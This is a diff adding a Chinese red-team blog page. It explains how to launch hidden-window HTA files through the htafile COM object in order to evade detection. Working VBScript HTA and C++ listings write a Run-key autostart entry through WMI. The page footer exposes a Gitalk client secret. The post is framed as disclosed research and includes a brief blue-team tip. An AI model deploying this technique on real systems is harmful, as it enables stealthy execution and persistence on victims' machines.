@@ -1,0 +1,498 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>利用HTML Application COM组件加载HTA 过检测修改注册表 - Daffodil</title>
+<link rel="shortcut icon" href="https://daffodi11.github.io/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://daffodi11.github.io/media/css/tailwind.css">
+<link rel="stylesheet" href="https://daffodi11.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="利用HTML Application COM组件加载HTA 过检测修改注册表 - Daffodil - Atom Feed" href="https://daffodi11.github.io/atom.xml">
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-220193003-2"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'UA-220193003-2');
+  </script>
+    
+
+  <meta name="description" content="起源
+想法来自一天分析恶意样本时，发现进程链是Excel-&amp;gt;mshta-&amp;gt;dllhost。
+研究
+使用OLEVIEW查看有关com组件
+
+google发现 早有人对此进行了分析https://codewhitesec.blogs..." />
+  <meta property="og:title" content="利用HTML Application COM组件加载HTA 过检测修改注册表 - Daffodil">
+  <meta property="og:description" content="起源
+想法来自一天分析恶意样本时，发现进程链是Excel-&amp;gt;mshta-&amp;gt;dllhost。
+研究
+使用OLEVIEW查看有关com组件
+
+google发现 早有人对此进行了分析https://codewhitesec.blogs..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/" />
+  <meta property="og:image" content="https://daffodi11.github.io/images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="利用HTML Application COM组件加载HTA 过检测修改注册表 - Daffodil">
+  <meta name="twitter:description" content="起源
+想法来自一天分析恶意样本时，发现进程链是Excel-&amp;gt;mshta-&amp;gt;dllhost。
+研究
+使用OLEVIEW查看有关com组件
+
+google发现 早有人对此进行了分析https://codewhitesec.blogs...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://daffodi11.github.io/media/css/prism-atom-dark.css">
+  
+
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://daffodi11.github.io" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      Daffodil
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          利用HTML Application COM组件加载HTA 过检测修改注册表
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2022-02-17 · 6 min read</div>
+          
+            <a href="https://daffodi11.github.io/tag/2VgSXZx_z/" class="text-gray-700 text-sm border-b-2 border-dotted border-gray-200 hover:border-gray-600 transition-all duration-100 inline-flex mr-2">
+              <i class="ri-hashtag"></i>
+              redteam
+            </a>
+          
+            <a href="https://daffodi11.github.io/tag/rt7PpEPh7/" class="text-gray-700 text-sm border-b-2 border-dotted border-gray-200 hover:border-gray-600 transition-all duration-100 inline-flex mr-2">
+              <i class="ri-hashtag"></i>
+              windows
+            </a>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <h2 id="起源">起源</h2>
+<p>想法来自一天分析恶意样本时，发现进程链是Excel-&gt;mshta-&gt;dllhost。</p>
+<h2 id="研究">研究</h2>
+<p>使用OLEVIEW查看有关com组件<br>
+<img src="https://daffodi11.github.io/post-images/1645067653228.jpg" alt="" loading="lazy"><br>
+google发现 早有人对此进行了分析https://codewhitesec.blogspot.com/2018/07/lethalhta.html</p>
+<p>hta文件可以执行js与vbs脚本<br>
+js与vbs又可以调用wmi</p>
+<p>但是打开hta会有窗口闪出影响效果<br>
+这里有两种方案<br>
+1、移动窗口 修改大小<br>
+window.moveTo 4000,4000<br>
+window.resizeTo 0,0<br>
+这种方法窗口会有短暂的停留<br>
+2、添加样式<br>
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;minimize&quot; SHOWINTASKBAR=&quot;no&quot;SYSMENU=&quot;no&quot; CAPTION=&quot;no&quot; /&gt;<br>
+当脚本运行时间过长时 桌面左下角会有窗口</p>
+<p>Emeric Nasi 通过设置属性 BORDER=&quot;none&quot; 结合前两种给出了最优方案<br>
+https://blog.sevagas.com/?Hide-HTA-window-for-RedTeam</p>
+<pre><code class="language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;normal&quot; SHOWINTASKBAR=&quot;no&quot; SYSMENU=&quot;no&quot;  CAPTION=&quot;no&quot; BORDER=&quot;none&quot; SCROLL=&quot;no&quot; /&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+ 
+Private Sub Hello()
+    CreateObject(&quot;WScript.Shell&quot;).run(&quot;calc&quot;)
+End Sub
+ 
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    Hello
+End Sub
+ 
+window.resizeTo 0,0
+AutoOpen
+Close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4 id="利用hta调用wmi修改注册表">利用hta调用wmi修改注册表</h4>
+<pre><code class="language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;normal&quot; SHOWINTASKBAR=&quot;no&quot; SYSMENU=&quot;no&quot;  CAPTION=&quot;no&quot; BORDER=&quot;none&quot; SCROLL=&quot;no&quot; /&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+Private Sub Hello()
+const HKEY_CURRENT_USER = &amp;H80000001
+strKeyPath = &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+MultValueName = &quot;daffodiltest&quot;
+strComputer = &quot;.&quot;
+iValues = &quot;c:\windows\system32\notepad.exe&quot;
+Set oReg=GetObject(&quot;winmgmts:{impersonationLevel = impersonate}!\\&quot; &amp; strComputer &amp; &quot;\root\default:StdRegProv&quot;)
+oReg.CreateKey HKEY_CURRENT_USER,strKeyPath
+oReg.SetStringValue HKEY_CURRENT_USER,strKeyPath,MultValueName,iValues
+End Sub
+Sub AutoOpen()
+    Hello
+End Sub
+window.resizeTo 0,0
+AutoOpen
+Close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<h2 id="cpp调用">CPP调用</h2>
+<pre><code class="language-CPP">	FILE * pFile;
+    pFile = fopen(&quot;C:\\Users\\Public\\TEST.HTA&quot;, &quot;w+&quot;);
+    if (pFile != NULL)
+	 {
+	    fprintf(pFile, &quot;&lt;!DOCTYPE html&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;html&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;head&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;HTA:APPLICATION icon=\&quot;#\&quot; WINDOWSTATE=\&quot;normal\&quot; SHOWINTASKBAR=\&quot;no\&quot; SYSMENU=\&quot;no\&quot;  CAPTION=\&quot;no\&quot; BORDER=\&quot;none\&quot; SCROLL=\&quot;no\&quot; /&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;script type=\&quot;text/vbscript\&quot;&gt;\n&quot;);
+		fprintf(pFile, &quot;Private Sub Hello()\n&quot;);
+		fprintf(pFile, &quot;const HKEY_CURRENT_USER = &amp;H80000001\n&quot;);
+		fprintf(pFile, &quot;strKeyPath = \&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\&quot;\n&quot;);
+		fprintf(pFile, &quot;MultValueName = \&quot;daffodiltest\&quot;\n&quot;);
+		fprintf(pFile, &quot;strComputer = \&quot;.\&quot;\n&quot;);
+		fprintf(pFile, &quot;iValues = \&quot;c:\\windows\\system32\\notepad.exe\&quot;\n&quot;);
+		fprintf(pFile, &quot;Set oReg=GetObject(\&quot;winmgmts:{impersonationLevel = impersonate}!\\\\\&quot; &amp; strComputer &amp; \&quot;\\root\\default:StdRegProv\&quot;)\n&quot;);
+		fprintf(pFile, &quot;oReg.CreateKey HKEY_CURRENT_USER,strKeyPath\n&quot;);
+		fprintf(pFile, &quot;oReg.SetStringValue HKEY_CURRENT_USER,strKeyPath,MultValueName,iValues\n&quot;);
+		fprintf(pFile, &quot;End Sub\n&quot;);
+		fprintf(pFile, &quot;Sub AutoOpen()\n&quot;);
+		fprintf(pFile, &quot;    Hello\n&quot;);
+		fprintf(pFile, &quot;End Sub\n&quot;);
+		fprintf(pFile, &quot;window.resizeTo 0,0\n&quot;);
+		fprintf(pFile, &quot;AutoOpen\n&quot;);
+		fprintf(pFile, &quot;Close\n&quot;);
+		fprintf(pFile, &quot;&lt;/script&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/head&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;body&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/body&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/html&gt;\n&quot;);
+		fclose(pFile);
+	 }
+
+	GUID gHtafile = { 0x3050f4d8,0x98b5,0x11cf,{ 0xbb,0x82,0x00,0xaa,0x00,0xbd,0xce,0x0b } };
+	HRESULT hr;
+	IUnknownPtr pOut;
+	IPersistMonikerPtr pPersMon;
+	IMonikerPtr pMoniker;
+
+	MULTI_QI* rgQI = new MULTI_QI[1];
+	COSERVERINFO stInfo = { 0 };
+	WCHAR pwszTarget[MAX_PATH];
+	WCHAR pwszHta[MAX_PATH];
+
+	wcscpy_s(pwszTarget, MAX_PATH, L&quot;LOCALHOST&quot;);
+	wcscpy_s(pwszHta, MAX_PATH, L&quot;C:\\Users\\Public\\TEST.HTA&quot;);
+
+	rgQI[0].pIID = &amp;IID_IUnknown;
+	rgQI[0].pItf = NULL;
+	rgQI[0].hr = 0;
+
+	stInfo.pwszName = pwszTarget;
+	stInfo.dwReserved1 = 0;
+	stInfo.dwReserved2 = 0;
+	stInfo.pAuthInfo = nullptr;
+
+	CoInitialize(0);
+	hr = CreateURLMonikerEx(NULL, pwszHta, &amp;pMoniker, 0);
+	hr = CoCreateInstanceEx(gHtafile, NULL, CLSCTX_LOCAL_SERVER, NULL, 1, rgQI);
+
+	if (hr != S_OK)
+	{
+		printf(&quot;Creating htafile COM object failed on target&quot;);
+	}
+
+	pOut = rgQI[0].pItf;
+	hr = pOut-&gt;QueryInterface(&amp;pPersMon);
+
+	FakeObject* pFake = new FakeObject(pMoniker);
+	hr = pPersMon-&gt;Load(FALSE, pFake, NULL, STGM_READ);
+	pFake-&gt;Release();
+	pMoniker = NULL;
+	pPersMon = NULL;
+	pOut = NULL;
+</code></pre>
+<p>成功修改注册表启动项<br>
+<img src="https://daffodi11.github.io/post-images/1645069118151.jpg" alt="" loading="lazy"></p>
+<p>当然也可以执行其他的wmi命令 例如创建进程、修改环境变量等等</p>
+<h4 id="tips-for-blue-team">Tips for blue team</h4>
+<p>监控mshta 与 dllhost</p>
+<h4 id="时间线">时间线</h4>
+<p>2021-07-25 20:53:12	 上报相关厂商<br>
+2022-02-17 11:41:22   验证已修复并披露</p>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+        
+          <div id="gitalk-container"></div>
+        
+
+        
+      
+
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E8%B5%B7%E6%BA%90">起源</a></li>
+<li><a href="#%E7%A0%94%E7%A9%B6">研究</a><br>
+*
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8hta%E8%B0%83%E7%94%A8wmi%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8">利用hta调用wmi修改注册表</a></li>
+</ul>
+</li>
+<li><a href="#cpp%E8%B0%83%E7%94%A8">CPP调用</a><br>
+*
+<ul>
+<li><a href="#tips-for-blue-team">Tips for blue team</a></li>
+<li><a href="#%E6%97%B6%E9%97%B4%E7%BA%BF">时间线</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://daffodi11.github.io/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://daffodi11.github.io/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+  
+    
+      <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script type="application/javascript" src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="application/javascript">
+
+  var gitalk = new Gitalk({
+    clientID: '14567eb76fbd8517a142',
+    clientSecret: '0554531da4bcec4ecfed7c23af678bb541868c75',
+    repo: 'daffodi11.github.io',
+    owner: 'daffodi11',
+    admin: ['daffodi11'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+    
+  
+</body>
+
+</html>
